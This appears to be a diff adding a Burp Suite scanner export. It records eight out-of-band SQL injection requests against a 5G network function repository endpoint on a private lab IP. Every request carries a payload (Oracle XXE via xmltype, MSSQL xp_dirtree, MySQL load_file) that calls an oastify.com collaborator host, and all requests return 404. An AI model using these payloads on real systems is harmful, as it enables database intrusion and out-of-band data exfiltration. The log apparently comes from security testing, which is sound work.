@@ -1,0 +1,210 @@
+<items exportTime="Sun Feb 19 12:47:13 CET 2023">
+  <item>
+    <time>Sun Feb 19 12:27:17 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rmdok%20SYSTEM%20%22http%3a%2f%2fkbz2r4himezm16hmozcgck15yw4n7bxz0nrahy6.oasti'%7c%7c'fy.com%2f%22%3e%25rmdok%3b]%3e')%2c'%2fl')%20from%20dual)]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rmdok%20SYSTEM%20%22http%3a%2f%2fkbz2r4himezm16hmozcgck15yw4n7bxz0nrahy6.oasti'%7c%7c'fy.com%2f%22%3e%25rmdok%3b]%3e')%2c'%2fl')%20from%20dual)]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rmdok%20SYSTEM%20%22http%3a%2f%2fkbz2r4himezm16hmozcgck15yw4n7bxz0nrahy6.oasti'%7c%7c'fy.com%2f%22%3e%25rmdok%3b]%3e')%2c'%2fl')%20from%20dual) HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>149</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 44
+
+{"cause":"RESOURCE_URI_STRUCTURE_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:27:18 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rmdok%20SYSTEM%20%22http%3a%2f%2ft5zbldbrgntvvfbvi86p6tves5yw1kr8vwmjc71.oasti'%7c%7c'fy.com%2f%22%3e%25rmdok%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c']]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rmdok%20SYSTEM%20%22http%3a%2f%2ft5zbldbrgntvvfbvi86p6tves5yw1kr8vwmjc71.oasti'%7c%7c'fy.com%2f%22%3e%25rmdok%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c']]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20rmdok%20SYSTEM%20%22http%3a%2f%2ft5zbldbrgntvvfbvi86p6tves5yw1kr8vwmjc71.oasti'%7c%7c'fy.com%2f%22%3e%25rmdok%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c' HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>149</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 44
+
+{"cause":"RESOURCE_URI_STRUCTURE_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:27:19 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c88eqose6j2wayuealn9498ytvk1b4zunld94wukj.oasti'%2b'fy.com%5cbik'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c88eqose6j2wayuealn9498ytvk1b4zunld94wukj.oasti'%2b'fy.com%5cbik'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c88eqose6j2wayuealn9498ytvk1b4zunld94wukj.oasti'%2b'fy.com%5cbik'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>149</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 44
+
+{"cause":"RESOURCE_URI_STRUCTURE_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:27:20 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cnlc517rlwh9pb9rpy2mjmnb88zeqhe72ytmk9axz.oasti'%2b'fy.com%5cuat'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cnlc517rlwh9pb9rpy2mjmnb88zeqhe72ytmk9axz.oasti'%2b'fy.com%5cuat'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cnlc517rlwh9pb9rpy2mjmnb88zeqhe72ytmk9axz.oasti'%2b'fy.com%5cuat'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>149</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 44
+
+{"cause":"RESOURCE_URI_STRUCTURE_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:27:21 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqb58rahomkzs1chso5cmcq1by24t7hx5oxcozen3.oasti'%2b'fy.com%5cmqq'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqb58rahomkzs1chso5cmcq1by24t7hx5oxcozen3.oasti'%2b'fy.com%5cmqq'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cqb58rahomkzs1chso5cmcq1by24t7hx5oxcozen3.oasti'%2b'fy.com%5cmqq'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>149</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 44
+
+{"cause":"RESOURCE_URI_STRUCTURE_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:27:22 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cwffevgluqq3y5ilysbgsgw5h288zbn1bs4gv3lra.oasti'%2b'fy.com%5cnid'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cwffevgluqq3y5ilysbgsgw5h288zbn1bs4gv3lra.oasti'%2b'fy.com%5cnid'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cwffevgluqq3y5ilysbgsgw5h288zbn1bs4gv3lra.oasti'%2b'fy.com%5cnid'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20 HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>149</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 44
+
+{"cause":"RESOURCE_URI_STRUCTURE_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:27:23 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=(select%20load_file('%5c%5c%5c%5c6elouqk4p0284sk8rlf2f64r1i79ax0lrnfe24qt.oastify.com%5c%5czdq'))]]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=(select%20load_file('%5c%5c%5c%5c6elouqk4p0284sk8rlf2f64r1i79ax0lrnfe24qt.oastify.com%5c%5czdq'))]]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features=(select%20load_file('%5c%5c%5c%5c6elouqk4p0284sk8rlf2f64r1i79ax0lrnfe24qt.oastify.com%5c%5czdq')) HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>149</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 44
+
+{"cause":"RESOURCE_URI_STRUCTURE_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+  <item>
+    <time>Sun Feb 19 12:27:24 CET 2023</time>
+    <url><![CDATA[http://192.168.70.130/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%2b(select%20load_file('%5c%5c%5c%5c0hiixknysu527mn2ufiwi07l4ca3dr3fuii95zto.oastify.com%5c%5cjkx'))%2b']]></url>
+    <host ip="192.168.70.130">192.168.70.130</host>
+    <port>80</port>
+    <protocol>http</protocol>
+    <method><![CDATA[GET]]></method>
+    <path><![CDATA[/nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%2b(select%20load_file('%5c%5c%5c%5c0hiixknysu527mn2ufiwi07l4ca3dr3fuii95zto.oastify.com%5c%5cjkx'))%2b']]></path>
+    <extension>null</extension>
+    <request base64="false"><![CDATA[GET /nnrf-nfm/v1/nf-instances/{nfInstanceID}?requester-features='%2b(select%20load_file('%5c%5c%5c%5c0hiixknysu527mn2ufiwi07l4ca3dr3fuii95zto.oastify.com%5c%5cjkx'))%2b' HTTP/1.1
+Host: 192.168.70.130
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
+Accept: application/json
+
+]]></request>
+    <status>404</status>
+    <responselength>149</responselength>
+    <mimetype>JSON</mimetype>
+    <response base64="false"><![CDATA[HTTP/1.1 404 Not Found
+Content-Type: application/problem+json
+Connection: Close
+Content-Length: 44
+
+{"cause":"RESOURCE_URI_STRUCTURE_NOT_FOUND"}]]></response>
+    <comment></comment>
+  </item>
+</items>
